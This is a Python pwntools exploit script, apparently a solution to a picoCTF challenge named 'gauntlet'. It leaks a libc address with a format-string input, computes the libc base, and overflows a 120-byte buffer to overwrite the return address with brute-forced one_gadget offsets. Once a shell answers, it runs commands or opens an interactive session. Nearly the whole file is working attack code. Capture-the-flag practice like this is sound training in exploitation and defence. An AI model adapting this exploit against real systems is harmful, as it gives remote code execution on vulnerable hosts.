#!/usr/bin/env python3

from pwn import *

exe = ELF("./gauntlet_patched_patched")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")

context.binary = exe
context.log_level = "info"

HOST = "wily-courier.picoctf.net"
PORT = 51502

OFFSET = 120
LIBC_START_MAIN_RET_OFF = 0x21C87
ONE_GADGET_OFFSETS = [0x4F302, 0x4F2A5, 0x10A2FC, 0x4F29E, 0x4F297]


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote(HOST, PORT)

    return r


def build_payload(libc_base, one_gadget_off):
    # strcpy() stops at first NUL byte, so we jump directly to a one_gadget
    # and only rely on partial overwrite of RIP.
    one_gadget = libc_base + one_gadget_off
    return b"A" * OFFSET + p64(one_gadget)


def main():
    for _ in range(30):
        for off in ONE_GADGET_OFFSETS:
            io = conn()
            try:
                io.sendline(b"%23$p")
                leak_line = io.recvline(timeout=1).strip()
                leak = int(leak_line, 16)
                libc_base = leak - LIBC_START_MAIN_RET_OFF
                log.success(f"leak:      {hex(leak)}")
                log.success(f"libc base: {hex(libc_base)}")
                log.info(f"trying one_gadget: {hex(off)}")

                payload = build_payload(libc_base, off)
                io.sendline(payload)
                sleep(0.15)
                io.sendline(b"echo PWNED")

                got = io.recv(timeout=2.5) or b""
                if b"PWNED" in got:
                    log.success("shell stabilized")
                    if args.CMD:
                        io.sendline(args.CMD.encode())
                        print(io.recvrepeat(1).decode("latin-1", errors="ignore"))
                        io.close()
                    else:
                        io.interactive()
                    return
            except EOFError:
                pass
            finally:
                try:
                    io.close()
                except Exception:
                    pass

    log.failure("all one_gadget attempts failed")


if __name__ == "__main__":
    main()
